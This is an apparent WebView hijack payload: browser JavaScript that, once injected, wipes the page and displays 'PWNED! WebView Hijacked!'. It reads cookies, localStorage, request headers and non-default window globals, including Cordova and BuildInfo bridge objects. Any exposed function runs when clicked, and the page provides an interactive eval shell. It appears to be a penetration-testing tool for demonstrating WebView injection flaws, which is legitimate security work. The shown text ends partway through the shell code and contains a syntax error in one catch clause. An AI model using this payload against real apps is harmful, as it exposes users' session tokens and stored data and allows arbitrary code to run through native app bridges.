(() => {
  THIS_WINDOW = [...new Set([...Object.keys(window), ...Object.getOwnPropertyNames(window)])];
  DEFAULT_WINDOW = ["0","1","2","3","4","window","self","document","name","location","customElements","history","locationbar","menubar","personalbar","scrollbars","statusbar","toolbar","status","closed","frames","length","top","opener","parent","frameElement","navigator","origin","external","screen","innerWidth","innerHeight","scrollX","pageXOffset","scrollY","pageYOffset","visualViewport","screenX","screenY","outerWidth","outerHeight","devicePixelRatio","clientInformation","screenLeft","screenTop","defaultStatus","defaultstatus","styleMedia","onsearch","isSecureContext","performance","onappinstalled","onbeforeinstallprompt","crypto","indexedDB","webkitStorageInfo","sessionStorage","localStorage","onbeforexrselect","onabort","onblur","oncancel","oncanplay","oncanplaythrough","onchange","onclick","onclose","oncontextmenu","oncuechange","ondblclick","ondrag","ondragend","ondragenter","ondragleave","ondragover","ondragstart","ondrop","ondurationchange","onemptied","onended","onerror","onfocus","onformdata","oninput","oninvalid","onkeydown","onkeypress","onkeyup","onload","onloadeddata","onloadedmetadata","onloadstart","onmousedown","onmouseenter","onmouseleave","onmousemove","onmouseout","onmouseover","onmouseup","onmousewheel","onpause","onplay","onplaying","onprogress","onratechange","onreset","onresize","onscroll","onseeked","onseeking","onselect","onstalled","onsubmit","onsuspend","ontimeupdate","ontoggle","onvolumechange","onwaiting","onwebkitanimationend","onwebkitanimationiteration","onwebkitanimationstart","onwebkittransitionend","onwheel","onauxclick","ongotpointercapture","onlostpointercapture","onpointerdown","onpointermove","onpointerup","onpointercancel","onpointerover","onpointerout","onpointerenter","onpointerleave","onselectstart","onselectionchange","onanimationend","onanimationiteration","onanimationstart","ontransitionrun","ontransitionstart","ontransitionend","ontransitioncancel","onafterprint","onbeforeprint","onbeforeunload","onhashchange","onlanguagechange","onmessage","onmessageerror","onoffline","ononline","onpagehide","onpageshow","onpopstate","onrejectionhandled","onstorage","onunhandledrejection","onunload","alert","atob","blur","btoa","cancelAnimationFrame","cancelIdleCallback","captureEvents","clearInterval","clearTimeout","close","confirm","createImageBitmap","fetch","find","focus","getComputedStyle","getSelection","matchMedia","moveBy","moveTo","open","postMessage","print","prompt","queueMicrotask","releaseEvents","requestAnimationFrame","requestIdleCallback","resizeBy","resizeTo","scroll","scrollBy","scrollTo","setInterval","setTimeout","stop","webkitCancelAnimationFrame","webkitRequestAnimationFrame","originAgentCluster","onpointerrawupdate","trustedTypes","onorientationchange","orientation","crossOriginIsolated","applicationCache","caches","cookieStore","ondevicemotion","ondeviceorientation","ondeviceorientationabsolute","ontouchcancel","ontouchend","ontouchmove","ontouchstart","URLS","cleanData","dumpLocalStorage","dumpDatabase","runIframeTest","runNextTest","Object","Function","Array","Number","parseFloat","parseInt","Infinity","NaN","undefined","Boolean","String","Symbol","Date","Promise","RegExp","Error","AggregateError","EvalError","RangeError","ReferenceError","SyntaxError","TypeError","URIError","globalThis","JSON","Math","console","Intl","ArrayBuffer","Uint8Array","Int8Array","Uint16Array","Int16Array","Uint32Array","Int32Array","Float32Array","Float64Array","Uint8ClampedArray","BigUint64Array","BigInt64Array","DataView","Map","BigInt","Set","WeakMap","WeakSet","Proxy","Reflect","decodeURI","decodeURIComponent","encodeURI","encodeURIComponent","escape","unescape","eval","isFinite","isNaN","SourceBufferList","SourceBuffer","MediaSource","CSSCounterStyleRule","OffscreenCanvasRenderingContext2D","OffscreenCanvas","DocumentTimeline","CSSTransition","CSSAnimation","AnimationTimeline","AnimationPlaybackEvent","VideoPlaybackQuality","BluetoothUUID","XSLTProcessor","EventCounts","TrustedTypePolicyFactory","TrustedTypePolicy","TrustedScriptURL","TrustedScript","TrustedHTML","webkitSpeechRecognitionEvent","webkitSpeechRecognitionError","webkitSpeechRecognition","webkitSpeechGrammarList","webkitSpeechGrammar","CSSPropertyRule","ContentIndex","CustomStateSet","Option","Image","Audio","webkitURL","webkitRTCPeerConnection","webkitMediaStream","WebKitMutationObserver","WebKitCSSMatrix","XPathResult","XPathExpression","XPathEvaluator","XMLSerializer","XMLHttpRequestUpload","XMLHttpRequestEventTarget","XMLHttpRequest","XMLDocument","WritableStreamDefaultWriter","WritableStream","Worker","Window","WheelEvent","WebSocket","WebGLVertexArrayObject","WebGLUniformLocation","WebGLTransformFeedback","WebGLTexture","WebGLSync","WebGLShaderPrecisionFormat","WebGLShader","WebGLSampler","WebGLRenderingContext","WebGLRenderbuffer","WebGLQuery","WebGLProgram","WebGLFramebuffer","WebGLContextEvent","WebGLBuffer","WebGLActiveInfo","WebGL2RenderingContext","WaveShaperNode","VisualViewport","ValidityState","VTTCue","UserActivation","URLSearchParams","URL","UIEvent","TreeWalker","TransitionEvent","TransformStream","TrackEvent","TouchList","TouchEvent","Touch","TimeRanges","TextTrackList","TextTrackCueList","TextTrackCue","TextTrack","TextMetrics","TextEvent","TextEncoderStream","TextEncoder","TextDecoderStream","TextDecoder","Text","TaskAttributionTiming","SyncManager","SubmitEvent","StyleSheetList","StyleSheet","StylePropertyMapReadOnly","StylePropertyMap","StorageEvent","Storage","StereoPannerNode","StaticRange","ShadowRoot","Selection","SecurityPolicyViolationEvent","ScriptProcessorNode","ScreenOrientation","Screen","SVGViewElement","SVGUseElement","SVGUnitTypes","SVGTransformList","SVGTransform","SVGTitleElement","SVGTextPositioningElement","SVGTextPathElement","SVGTextElement","SVGTextContentElement","SVGTSpanElement","SVGSymbolElement","SVGSwitchElement","SVGStyleElement","SVGStringList","SVGStopElement","SVGSetElement","SVGScriptElement","SVGSVGElement","SVGRectElement","SVGRect","SVGRadialGradientElement","SVGPreserveAspectRatio","SVGPolylineElement","SVGPolygonElement","SVGPointList","SVGPoint","SVGPatternElement","SVGPathElement","SVGNumberList","SVGNumber","SVGMetadataElement","SVGMatrix","SVGMaskElement","SVGMarkerElement","SVGMPathElement","SVGLinearGradientElement","SVGLineElement","SVGLengthList","SVGLength","SVGImageElement","SVGGraphicsElement","SVGGradientElement","SVGGeometryElement","SVGGElement","SVGForeignObjectElement","SVGFilterElement","SVGFETurbulenceElement","SVGFETileElement","SVGFESpotLightElement","SVGFESpecularLightingElement","SVGFEPointLightElement","SVGFEOffsetElement","SVGFEMorphologyElement","SVGFEMergeNodeElement","SVGFEMergeElement","SVGFEImageElement","SVGFEGaussianBlurElement","SVGFEFuncRElement","SVGFEFuncGElement","SVGFEFuncBElement","SVGFEFuncAElement","SVGFEFloodElement","SVGFEDropShadowElement","SVGFEDistantLightElement","SVGFEDisplacementMapElement","SVGFEDiffuseLightingElement","SVGFEConvolveMatrixElement","SVGFECompositeElement","SVGFEComponentTransferElement","SVGFEColorMatrixElement","SVGFEBlendElement","SVGEllipseElement","SVGElement","SVGDescElement","SVGDefsElement","SVGComponentTransferFunctionElement","SVGClipPathElement","SVGCircleElement","SVGAnimationElement","SVGAnimatedTransformList","SVGAnimatedString","SVGAnimatedRect","SVGAnimatedPreserveAspectRatio","SVGAnimatedNumberList","SVGAnimatedNumber","SVGAnimatedLengthList","SVGAnimatedLength","SVGAnimatedInteger","SVGAnimatedEnumeration","SVGAnimatedBoolean","SVGAnimatedAngle","SVGAnimateTransformElement","SVGAnimateMotionElement","SVGAnimateElement","SVGAngle","SVGAElement","Response","ResizeObserverSize","ResizeObserverEntry","ResizeObserver","Request","ReportingObserver","ReadableStreamDefaultReader","ReadableStreamDefaultController","ReadableStreamBYOBRequest","ReadableStreamBYOBReader","ReadableStream","ReadableByteStreamController","Range","RadioNodeList","RTCTrackEvent","RTCStatsReport","RTCSessionDescription","RTCSctpTransport","RTCRtpTransceiver","RTCRtpSender","RTCRtpReceiver","RTCPeerConnectionIceEvent","RTCPeerConnectionIceErrorEvent","RTCPeerConnection","RTCIceCandidate","RTCErrorEvent","RTCError","RTCEncodedVideoFrame","RTCEncodedAudioFrame","RTCDtlsTransport","RTCDataChannelEvent","RTCDataChannel","RTCDTMFToneChangeEvent","RTCDTMFSender","RTCCertificate","PromiseRejectionEvent","ProgressEvent","ProcessingInstruction","PopStateEvent","PointerEvent","PluginArray","Plugin","PeriodicWave","PerformanceTiming","PerformanceServerTiming","PerformanceResourceTiming","PerformancePaintTiming","PerformanceObserverEntryList","PerformanceObserver","PerformanceNavigationTiming","PerformanceNavigation","PerformanceMeasure","PerformanceMark","PerformanceLongTaskTiming","PerformanceEventTiming","PerformanceEntry","PerformanceElementTiming","Performance","Path2D","PannerNode","PageTransitionEvent","OverconstrainedError","OscillatorNode","OfflineAudioContext","OfflineAudioCompletionEvent","NodeList","NodeIterator","NodeFilter","Node","NetworkInformation","Navigator","NamedNodeMap","MutationRecord","MutationObserver","MutationEvent","MouseEvent","MimeTypeArray","MimeType","MessagePort","MessageEvent","MessageChannel","MediaStreamTrackEvent","MediaStreamTrack","MediaStreamEvent","MediaStreamAudioSourceNode","MediaStreamAudioDestinationNode","MediaStream","MediaRecorder","MediaQueryListEvent","MediaQueryList","MediaList","MediaError","MediaEncryptedEvent","MediaElementAudioSourceNode","MediaCapabilities","Location","LayoutShiftAttribution","LayoutShift","LargestContentfulPaint","KeyframeEffect","KeyboardEvent","IntersectionObserverEntry","IntersectionObserver","InputEvent","InputDeviceInfo","InputDeviceCapabilities","ImageData","ImageCapture","ImageBitmapRenderingContext","ImageBitmap","IdleDeadline","IIRFilterNode","IDBVersionChangeEvent","IDBTransaction","IDBRequest","IDBOpenDBRequest","IDBObjectStore","IDBKeyRange","IDBIndex","IDBFactory","IDBDatabase","IDBCursorWithValue","IDBCursor","History","Headers","HashChangeEvent","HTMLVideoElement","HTMLUnknownElement","HTMLUListElement","HTMLTrackElement","HTMLTitleElement","HTMLTimeElement","HTMLTextAreaElement","HTMLTemplateElement","HTMLTableSectionElement","HTMLTableRowElement","HTMLTableElement","HTMLTableColElement","HTMLTableCellElement","HTMLTableCaptionElement","HTMLStyleElement","HTMLSpanElement","HTMLSourceElement","HTMLSlotElement","HTMLSelectElement","HTMLScriptElement","HTMLQuoteElement","HTMLProgressElement","HTMLPreElement","HTMLPictureElement","HTMLParamElement","HTMLParagraphElement","HTMLOutputElement","HTMLOptionsCollection","HTMLOptionElement","HTMLOptGroupElement","HTMLObjectElement","HTMLOListElement","HTMLModElement","HTMLMeterElement","HTMLMetaElement","HTMLMenuElement","HTMLMediaElement","HTMLMarqueeElement","HTMLMapElement","HTMLLinkElement","HTMLLegendElement","HTMLLabelElement","HTMLLIElement","HTMLInputElement","HTMLImageElement","HTMLIFrameElement","HTMLHtmlElement","HTMLHeadingElement","HTMLHeadElement","HTMLHRElement","HTMLFrameSetElement","HTMLFrameElement","HTMLFormElement","HTMLFormControlsCollection","HTMLFontElement","HTMLFieldSetElement","HTMLEmbedElement","HTMLElement","HTMLDocument","HTMLDivElement","HTMLDirectoryElement","HTMLDialogElement","HTMLDetailsElement","HTMLDataListElement","HTMLDataElement","HTMLDListElement","HTMLCollection","HTMLCanvasElement","HTMLButtonElement","HTMLBodyElement","HTMLBaseElement","HTMLBRElement","HTMLAudioElement","HTMLAreaElement","HTMLAnchorElement","HTMLAllCollection","GeolocationPositionError","GeolocationPosition","GeolocationCoordinates","Geolocation","GamepadHapticActuator","GamepadEvent","GamepadButton","Gamepad","GainNode","FormDataEvent","FormData","FontFaceSetLoadEvent","FontFace","FocusEvent","FileReader","FileList","File","FeaturePolicy","External","EventTarget","EventSource","Event","ErrorEvent","ElementInternals","Element","DynamicsCompressorNode","DragEvent","DocumentType","DocumentFragment","Document","DelayNode","DecompressionStream","DataTransferItemList","DataTransferItem","DataTransfer","DOMTokenList","DOMStringMap","DOMStringList","DOMRectReadOnly","DOMRectList","DOMRect","DOMQuad","DOMPointReadOnly","DOMPoint","DOMParser","DOMMatrixReadOnly","DOMMatrix","DOMImplementation","DOMException","DOMError","CustomEvent","CustomElementRegistry","Crypto","CountQueuingStrategy","ConvolverNode","ConstantSourceNode","CompressionStream","CompositionEvent","Comment","CloseEvent","ClipboardItem","ClipboardEvent","CharacterData","ChannelSplitterNode","ChannelMergerNode","CanvasRenderingContext2D","CanvasPattern","CanvasGradient","CanvasCaptureMediaStreamTrack","CSSVariableReferenceValue","CSSUnparsedValue","CSSUnitValue","CSSTranslate","CSSTransformValue","CSSTransformComponent","CSSSupportsRule","CSSStyleValue","CSSStyleSheet","CSSStyleRule","CSSStyleDeclaration","CSSSkewY","CSSSkewX","CSSSkew","CSSScale","CSSRuleList","CSSRule","CSSRotate","CSSPositionValue","CSSPerspective","CSSPageRule","CSSNumericValue","CSSNumericArray","CSSNamespaceRule","CSSMediaRule","CSSMatrixComponent","CSSMathValue","CSSMathSum","CSSMathProduct","CSSMathNegate","CSSMathMin","CSSMathMax","CSSMathInvert","CSSKeywordValue","CSSKeyframesRule","CSSKeyframeRule","CSSImportRule","CSSImageValue","CSSGroupingRule","CSSFontFaceRule","CSSConditionRule","CSS","CDATASection","ByteLengthQueuingStrategy","BroadcastChannel","BlobEvent","Blob","BiquadFilterNode","BeforeUnloadEvent","BeforeInstallPromptEvent","BatteryManager","BaseAudioContext","BarProp","AudioWorkletNode","AudioScheduledSourceNode","AudioProcessingEvent","AudioParamMap","AudioParam","AudioNode","AudioListener","AudioDestinationNode","AudioContext","AudioBufferSourceNode","AudioBuffer","Attr","AnimationEvent","AnimationEffect","Animation","AnalyserNode","AbstractRange","AbortSignal","AbortController","event","offscreenBuffering","Atomics","FinalizationRegistry","WeakRef","WebAssembly","USB","USBAlternateInterface","USBConfiguration","USBConnectionEvent","USBDevice","USBEndpoint","USBInTransferResult","USBInterface","USBIsochronousInTransferPacket","USBIsochronousInTransferResult","USBIsochronousOutTransferPacket","USBIsochronousOutTransferResult","USBOutTransferResult","WakeLock","WakeLockSentinel","AbsoluteOrientationSensor","Accelerometer","AudioWorklet","Cache","CacheStorage","Clipboard","CookieChangeEvent","CookieStore","CookieStoreManager","Credential","CredentialsContainer","CryptoKey","DeviceMotionEvent","DeviceMotionEventAcceleration","DeviceMotionEventRotationRate","DeviceOrientationEvent","FederatedCredential","Gyroscope","Keyboard","KeyboardLayoutMap","LinearAccelerationSensor","Lock","LockManager","MIDIAccess","MIDIConnectionEvent","MIDIInput","MIDIInputMap","MIDIMessageEvent","MIDIOutput","MIDIOutputMap","MIDIPort","MediaDeviceInfo","MediaDevices","MediaKeyMessageEvent","MediaKeySession","MediaKeyStatusMap","MediaKeySystemAccess","MediaKeys","NavigationPreloadManager","OrientationSensor","PasswordCredential","RTCIceTransport","RelativeOrientationSensor","Sensor","SensorErrorEvent","ServiceWorker","ServiceWorkerContainer","ServiceWorkerRegistration","StorageManager","SubtleCrypto","Worklet","XRDOMOverlayState","XRLayer","XRWebGLBinding","Bluetooth","BluetoothCharacteristicProperties","BluetoothDevice","BluetoothRemoteGATTCharacteristic","BluetoothRemoteGATTDescriptor","BluetoothRemoteGATTServer","BluetoothRemoteGATTService","FragmentDirective","ApplicationCache","ApplicationCacheErrorEvent","ContactsManager","NavigatorManagedData","Scheduling","NDEFMessage","NDEFReader","NDEFReadingEvent","NDEFRecord","ContactAddress","BarcodeDetector","GravitySensor","dir","dirxml","profile","profileEnd","clear","table","keys","values","debug","undebug","monitor","unmonitor","inspect","copy","queryObjects","$_","$0","$1","$2","$3","$4","getEventListeners","monitorEvents","unmonitorEvents","$","$$","$x","navigation","onbeforeinput","onbeforematch","onbeforetoggle","oncontentvisibilityautostatechange","oncontextlost","oncontextrestored","onsecuritypolicyviolation","onslotchange","scheduler","reportError","structuredClone","chrome","launchQueue","sharedStorage","documentPictureInPicture","getScreenDetails","queryLocalFonts","showDirectoryPicker","showOpenFilePicker","showSaveFilePicker","onpageswap","onpagereveal","credentialless","fence","speechSynthesis","onscrollend","onscrollsnapchange","onscrollsnapchanging","webkitRequestFileSystem","webkitResolveLocalFileSystemURL","THIS_WINDOW","DEFAULT_WINDOW","WritableStreamDefaultController","WindowControlsOverlayGeometryChangeEvent","WindowControlsOverlay","WebGLObject","VisibilityStateEntry","VirtualKeyboardGeometryChangeEvent","ViewTransition","VideoFrame","VideoColorSpace","URLPattern","TransformStreamDefaultController","ToggleEvent","TextUpdateEvent","TextFormatUpdateEvent","TextFormat","TaskSignal","TaskPriorityChangeEvent","TaskController","Scheduler","Profiler","PictureInPictureWindow","PictureInPictureEvent","NavigatorUAData","NavigationTransition","NavigationHistoryEntry","NavigationDestination","NavigationCurrentEntryChangeEvent","Navigation","NavigateEvent","MediaStreamTrackVideoStats","MediaStreamTrackProcessor","MediaStreamTrackGenerator","MediaStreamTrackAudioStats","MediaSourceHandle","MathMLElement","Ink","HighlightRegistry","Highlight","EncodedVideoChunk","EncodedAudioChunk","EditContext","DelegatedInkTrailPresenter","ContentVisibilityAutoStateChangeEvent","CloseWatcher","CharacterBoundsUpdateEvent","CSSStartingStyleRule","CSSScopeRule","CSSPositionTryRule","CSSPositionTryDescriptors","CSSMathClamp","CSSLayerStatementRule","CSSLayerBlockRule","CSSFontPaletteValuesRule","CSSContainerRule","BrowserCaptureMediaStreamTrack","AudioSinkInfo","AudioData","Iterator","AudioDecoder","AudioEncoder","GPU","GPUAdapter","GPUAdapterInfo","GPUBindGroup","GPUBindGroupLayout","GPUBuffer","GPUBufferUsage","GPUCanvasContext","GPUColorWrite","GPUCommandBuffer","GPUCommandEncoder","GPUCompilationInfo","GPUCompilationMessage","GPUComputePassEncoder","GPUComputePipeline","GPUDevice","GPUDeviceLostInfo","GPUError","GPUExternalTexture","GPUInternalError","GPUMapMode","GPUOutOfMemoryError","GPUPipelineError","GPUPipelineLayout","GPUQuerySet","GPUQueue","GPURenderBundle","GPURenderBundleEncoder","GPURenderPassEncoder","GPURenderPipeline","GPUSampler","GPUShaderModule","GPUShaderStage","GPUSupportedFeatures","GPUSupportedLimits","GPUTexture","GPUTextureUsage","GPUTextureView","GPUUncapturedErrorEvent","GPUValidationError","IdleDetector","ImageDecoder","ImageTrack","ImageTrackList","ScreenDetailed","ScreenDetails","VideoDecoder","VideoEncoder","VirtualKeyboard","WGSLLanguageFeatures","WebTransport","WebTransportBidirectionalStream","WebTransportDatagramDuplexStream","WebTransportError","AuthenticatorAssertionResponse","AuthenticatorAttestationResponse","AuthenticatorResponse","PublicKeyCredential","CaptureController","DocumentPictureInPicture","EyeDropper","FileSystemDirectoryHandle","FileSystemFileHandle","FileSystemHandle","FileSystemWritableFileStream","FontData","HID","HIDConnectionEvent","HIDDevice","HIDInputReportEvent","IdentityCredential","IdentityProvider","IdentityCredentialError","LaunchParams","LaunchQueue","NavigatorLogin","NotRestoredReasonDetails","NotRestoredReasons","OTPCredential","PaymentAddress","PaymentRequest","PaymentRequestUpdateEvent","PaymentResponse","PaymentManager","PaymentMethodChangeEvent","Presentation","PresentationAvailability","PresentationConnection","PresentationConnectionAvailableEvent","PresentationConnectionCloseEvent","PresentationConnectionList","PresentationReceiver","PresentationRequest","PressureObserver","PressureRecord","ProtectedAudience","Serial","SerialPort","StorageBucket","StorageBucketManager","XRAnchor","XRAnchorSet","XRBoundedReferenceSpace","XRCPUDepthInformation","XRCamera","XRDepthInformation","XRFrame","XRHitTestResult","XRHitTestSource","XRInputSource","XRInputSourceArray","XRInputSourceEvent","XRInputSourcesChangeEvent","XRLightEstimate","XRLightProbe","XRPose","XRRay","XRReferenceSpace","XRReferenceSpaceEvent","XRRenderState","XRRigidTransform","XRSession","XRSessionEvent","XRSpace","XRSystem","XRTransientInputHitTestResult","XRTransientInputHitTestSource","XRView","XRViewerPose","XRViewport","XRWebGLDepthInformation","XRWebGLLayer","XRHand","XRJointPose","XRJointSpace","BackgroundFetchManager","BackgroundFetchRecord","BackgroundFetchRegistration","CSSMarginRule","CSSNestedDeclarations","CSSViewTransitionRule","CaretPosition","ChapterInformation","CropTarget","DocumentPictureInPictureEvent","Fence","FencedFrameConfig","HTMLFencedFrameElement","MediaMetadata","MediaSession","NavigationActivation","Notification","PageRevealEvent","PageSwapEvent","PerformanceLongAnimationFrameTiming","PerformanceScriptTiming","PeriodicSyncManager","PermissionStatus","Permissions","PushManager","PushSubscription","PushSubscriptionOptions","RemotePlayback","ScrollTimeline","ViewTimeline","SharedStorage","SharedStorageWorklet","SharedWorker","SnapEvent","SpeechSynthesis","SpeechSynthesisErrorEvent","SpeechSynthesisEvent","SpeechSynthesisUtterance","SpeechSynthesisVoice","ViewTransitionTypeSet","WebSocketError","WebSocketStream","getAccessibleName","getAccessibleRole"];

  const GREEN = '#16c1a2';
  const RED = '#DD4B21';
  const BLUE = '#0EC7F0';

  // injected server-side when loaded from https://oak.hackstree.io/android/webview/pwn.html
  const HEADERS = {};

  const VARS = THIS_WINDOW.filter(item => !DEFAULT_WINDOW.includes(item));
  let CORDOVA = false;

  const mainDiv = document.createElement('div');
  mainDiv.style.padding = '5px';
  mainDiv.style.width = '100%';
  mainDiv.style.overflowWrap = 'break-word';
  const pillsDiv = document.createElement('div');
  pillsDiv.style.margin = '5px';
  pillsDiv.style.display = 'none';
  const keysDiv = document.createElement('div');
  keysDiv.style.margin = '5px';

  mainDiv.appendChild(pillsDiv);
  pillsDiv.style.display = 'none';

  document.body.replaceChildren();
  document.body.appendChild(mainDiv);
  document.body.style.backgroundColor = '#151519';
  document.body.style.color = 'white';
  document.body.style.fontFamily = 'Arial, sans-serif';

  function header(text, color) {
      const pillSpan = document.createElement('div');
      pillSpan.innerText = text;
      pillSpan.style.backgroundColor = color || GREEN;
      pillSpan.style.borderRadius = '10px';
      pillSpan.style.marginTop = '10px';
      pillSpan.style.padding = '2px 8px';
      pillSpan.style.fontWeight = 'bold';
      pillSpan.style.cursor = 'pointer';
      return pillSpan;
  }

  mainDiv.appendChild(header('PWNED! WebView Hijacked!', RED));
  const originDiv = document.createElement('pre');
  originDiv.style.margin = '5px';
  originDiv.style.overflowX = 'scroll';
  mainDiv.appendChild(originDiv);
  let originText = `window.location = ${window.location}\n`;
  originText += `window.location.origin = ${window.location.origin}\n`;
  try{ originText += `document.cookie = ${document.cookie}\n`; } catch() {}
  originText += `window.navigator.appVersion = ${window.navigator.appVersion}\n`;
  originDiv.innerText = originText;

  const header_el = header('JavaScript Shell', RED);
  const vars_el = document.createElement('div');
  header_el.onclick = () => {
      vars_el.style.display = vars_el.style.display === 'none' ? 'block' : 'none';
  }
  const wrapper = document.createElement('div');
  wrapper.style.margin = '5px';
  mainDiv.appendChild(header_el);
  mainDiv.appendChild(vars_el);

  if(Object.keys(HEADERS).length>0) {
      const header_el = header('HTTP Request Headers', BLUE);
      const vars_el = dumpVars(HEADERS, Object.keys(HEADERS));
      header_el.onclick = () => {
          vars_el.style.display = vars_el.style.display === 'none' ? 'block' : 'none';
      }
      const wrapper = document.createElement('div');
      wrapper.style.margin = '5px';
      mainDiv.appendChild(header_el);
      mainDiv.appendChild(vars_el);
  }

  if(document.cookie) {
      const header_el = header('Cookies', BLUE);
      const cookieObj = {};
      const cookiesArr = document.cookie.split(';');
      cookiesArr.forEach(cookie => {
          // Trim whitespace and then split on the first '='
          const [key, ...valueParts] = cookie.trim().split('=');
          // Join the remaining parts in case the value contains '=' characters
          const value = valueParts.join('=');
          cookieObj[key] = decodeURIComponent(value);
      });

      const vars_el = dumpVars(cookieObj, Object.keys(cookieObj));
      header_el.onclick = () => {
          vars_el.style.display = vars_el.style.display === 'none' ? 'block' : 'none';
      }
      mainDiv.appendChild(header_el);
      mainDiv.appendChild(vars_el);
  }

  if(window.localStorage && Object.keys(localStorage).length > 0) {
      const header_el = header('Local Storage', BLUE);
      const vars_el = dumpVars(localStorage, Object.keys(localStorage));
      header_el.onclick = () => {
          vars_el.style.display = vars_el.style.display === 'none' ? 'block' : 'none';
      }
      mainDiv.appendChild(header_el);
      mainDiv.appendChild(vars_el);
  }

  function dumpVars(obj, keys, depth) {
      const wrapper = document.createElement('div');
      wrapper.style.margin = '5px';
      keys.map((k) => {
          const e = document.createElement('div');
          wrapper.append(e);
          const k_el = document.createElement('b');
          const v_el = document.createElement('span');

          e.append(k_el);
          e.append(v_el);
          k_el.style.paddingRight = '10px';
          k_el.innerText = k;
          const v = obj[k];
          if(Array.isArray(v)) {
            v_el.innerText = `List: [${v.map(i => { if(typeof(i)=='function') return '<function() {...}>'; else return i;}).join(', ')}]`;
            v_el.style.color = '#acaeb6';
          } else if(typeof(v) === 'object' && v !== null) {
              if(v!=null && v.toString) {
                v_el.innerText = `Object: ${v.toString() || '...'}`;
              } else {
                v_el.innerText = `Object: null`;
              }

              if((depth < 4 || depth === undefined) && Object.keys(v).length>0) {
                  const inner = dumpVars(v, Object.keys(v), (depth||0)+1);
                  v_el.append(inner);

                  const prefix = document.createElement('span');
                  prefix.style.fontWeight = 'bold';
                  prefix.style.color = BLUE;
                  prefix.style.fontFamily = 'monospace';
                  prefix.style.marginRight = '5px';
                  prefix.innerText = "[-]";
                  inner.style.borderLeft = `2px solid ${BLUE}`;
                  inner.style.paddingLeft = '10px';
                  inner.style.cursor = 'default';
                  const toggle = (event) => {
                    if (event.target === event.currentTarget) {
                      inner.style.display = inner.style.display === 'none' ? 'block' : 'none';
                      if(inner.style.display === 'none') {
                          prefix.innerText = "[+]";
                      } else {
                          prefix.innerText = "[-]";
                      }
                    }
                  };
                  e.prepend(prefix);
                  v_el.onclick = toggle;
                  v_el.style.cursor = 'pointer';
                  k_el.onclick = toggle;
                  k_el.style.cursor = 'pointer';
                  prefix.onclick = toggle;
                  prefix.style.cursor = 'pointer';
              }
          } else if(typeof(v) === 'string') {
              v_el.innerText = `"${v}"`;
              v_el.style.fontStyle = 'italic';
              v_el.style.color = '#acaeb6';
          } else if(typeof(v) === 'function') {
              v_el.innerText = '<function() { /* click to execute */ }>';
              v_el.style.textDecoration = 'underline';
              v_el.style.cursor = 'pointer';
              v_el.style.color = RED;
              v_el.onclick = (e) => {
                  try {
                    e.target.innerText = `result: ${obj[k]()}`;
                  } catch (e) {
                    e.target.innerText = `error: ${e.message}`;
                  }
                  e.target.style.fontStyle = 'italic';
                  e.target.style.textDecoration = 'none';
                  e.target.style.cursor = 'auto';
                  e.target.style.color = '#acaeb6';
              }
          } else{
              v_el.innerText = typeof(v);
          }
      });
      return wrapper;
  }


  // check 'cordova' in vars
  if (VARS.includes('cordova')) {
      const cordova = [...new Set([...Object.keys(window.cordova), ...Object.getOwnPropertyNames(window.cordova)])];
      const header_el = header('Cordova Detected');
      const vars_el = dumpVars(window.cordova, cordova);
      vars_el.style.display = 'none';
      header_el.onclick = () => {
          vars_el.style.display = vars_el.style.display === 'none' ? 'block' : 'none';
      }
      pillsDiv.appendChild(header_el);
      pillsDiv.appendChild(vars_el);
      pillsDiv.style.display = 'block';
  }

  if (VARS.includes('Cordova')) {
      const cordova = [...new Set([...Object.keys(window.Cordova), ...Object.getOwnPropertyNames(window.Cordova)])];
      const header_el = header('window.Cordova');
      const vars_el = dumpVars(window.Cordova, cordova);
      vars_el.style.display = 'none';
      header_el.onclick = () => {
          vars_el.style.display = vars_el.style.display === 'none' ? 'block' : 'none';
      }
      pillsDiv.appendChild(header_el);
      pillsDiv.appendChild(vars_el);
      pillsDiv.style.display = 'block';
  }

  if (VARS.includes('BuildInfo')) {
      const cordova = [...new Set([...Object.keys(window.BuildInfo), ...Object.getOwnPropertyNames(window.BuildInfo)])];
      const header_el = header('window.BuildInfo (Cordova)');
      const vars_el = dumpVars(window.BuildInfo, cordova);
      vars_el.style.display = 'none';
      header_el.onclick = () => {
          vars_el.style.display = vars_el.style.display === 'none' ? 'block' : 'none';
      }
      pillsDiv.appendChild(header_el);
      pillsDiv.appendChild(vars_el);
      pillsDiv.style.display = 'block';
  }

  if(VARS.length > 0) {
      const header_el = header('Window Variables', BLUE);
      const vars_el = dumpVars(window, VARS);
      header_el.onclick = () => {
          vars_el.style.display = vars_el.style.display === 'none' ? 'block' : 'none';
      }
      mainDiv.appendChild(header_el);
      mainDiv.appendChild(vars_el);
  }

  function setupJSEvalShell(container) {
      // Container styling
      container.style.display = 'flex';
      container.style.flexDirection = 'column';
      container.style.fontFamily = 'monospace';
      container.style.flex = '1';

      // Create output and input elements
      const output = document.createElement('div');
      output.className = 'output';
      output.style.flex = '1';
      output.style.overflowY = 'auto';
      output.style.padding = '5px';
      output.style.boxSizing = 'border-box';
      output.style.whiteSpace = 'pre-wrap';

      const inputLine = document.createElement('div');
      inputLine.className = 'input-line';
      inputLine.style.display = 'flex';
      inputLine.style.border = '1px solid #242424';
      inputLine.style.alignItems = 'flex-start';
      inputLine.style.padding = '7px 5px 2px 5px';
      inputLine.style.boxSizing = 'border-box';

      const promptSpan = document.createElement('span');
      promptSpan.className = 'prompt';
      promptSpan.textContent = '>>>';
      promptSpan.style.paddingTop = '2px';
      promptSpan.style.flexShrink = '0';

      const textarea = document.createElement('textarea');
      textarea.rows = 1;
      textarea.style.width = '100%';
      textarea.style.background = '#151519';
      textarea.style.color = 'white';
      textarea.style.border = 'none';
      textarea.style.outline = 'none';
      textarea.style.resize = 'none';
      textarea.style.overflow = 'hidden';
      textarea.style.marginLeft = '5px';

      const runButton = document.createElement('button');
      runButton.textContent = 'Run';
      runButton.style.marginLeft = '5px';
      runButton.style.padding = '2px 10px';
      runButton.style.border = '1px solid #242424';
      runButton.style.backgroundColor = '#242424';
      runButton.style.color = 'white';
      runButton.style.cursor = 'pointer';
      runButton.style.fontFamily = 'monospace';

      runButton.addEventListener('click', () => {
        const code = textarea.value.trim();
        if (code) {
          runCode(code);
        }
      });

      inputLine.appendChild(promptSpan);
      inputLine.appendChild(textarea);
      inputLine.appendChild(runButton);

      container.appendChild(output);
      container.appendChild(inputLine);

      // History management
      let history = [];
      let historyIndex = 0;

      adjustTextareaHeight();

      function appendLineToOutput(text, color) {
        const line = document.createElement('div');
        line.textContent = text;
        if (color) {
          line.style.color = color;
        }
        output.appendChild(line);
        output.scrollTop = output.scrollHeight;
        inputLine.scrollIntoView(false);
      }


